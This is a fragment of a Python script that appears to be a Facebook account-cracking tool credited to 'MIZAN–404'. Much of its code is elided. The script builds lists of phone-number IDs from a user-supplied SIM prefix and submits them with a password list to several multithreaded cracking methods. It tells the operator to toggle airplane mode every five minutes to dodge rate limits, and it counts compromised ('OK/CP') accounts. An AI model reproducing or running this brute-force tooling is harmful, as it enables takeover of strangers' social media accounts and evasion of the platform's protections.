...
try:
	...
	os.system('python MIZAN.py')
	
print('[•] Join My Facebook Profile')
os.system('xdg-open https://www.facebook.com/100016670591754')
...
logo=("""\033[1;91m
        ...
        \033[1;32m    ██      ██ ██ ███████ ██   ██ ██   ████ 
\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[~] GitHub   : MIZAN–404
\033[1;32m[~] Facebook : MD MIZAN MIAH
\033[1;32m[~] Tool     : TRIAL 
\033[1;32m[~] Version  : 01.0.01
\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
		...
		#	os.system('xdg-open https://www.facebook.com/100016670591754')
			if xd in ['1','01']:
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;37mTURN ON/OFF AIRPLANE MODE EVERY 5 MINUTE')
					linex()
					for user in fo:
...
def pak():
		user=[]
		clear()
		print('\033[1;33m Code example: 019,017,018,016,015')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;34m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as MIZAN:	
			clear()
			tl = str(len(user))
			print('\033[1;32mTOTAL IDS: \033[1;33m'+tl+f' ')
			print(f'\033[1;32mSIM CODE: \033[1;33m '+code)
			print(' \033[1;37mTURN ON/OFF AIRPLANE MODE EVERY 5 MINUTE')
			linex()
			for psx in user:
				ids = code+psx
				...
				if mthd in ['1','01']:
					MIZAN.submit(MIZAN1,ids,passlist)
				if mthd in ['2','02']:
					MIZAN.submit(MIZAN2,ids,passlist)
				if mthd in ['3','03']:
					MIZAN.submit(MIZAN3,ids,passlist)
				if mthd in ['4','04']:
					MIZAN.submit(MIZAN4,ids,passlist)
				if mthd in ['5','05']:
					MIZAN.submit(MIZAN5,ids,passlist)
				if mthd in ['6','06']:
					MIZAN.submit(MIZAN6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' CRACK DONE BRO.....')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
try:
	menu()
